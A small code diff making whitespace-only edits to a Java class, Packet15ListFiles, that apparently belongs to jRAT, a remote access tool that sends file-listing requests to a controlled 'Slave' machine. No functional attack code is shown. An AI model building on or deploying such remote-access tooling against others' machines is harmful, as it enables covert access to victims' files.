@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet15ListFiles extends AbstractOutgoingPacket {
 
 	private String path;
-	
+
 	public Packet15ListFiles(String path) {
 		this.path = path;
 	}
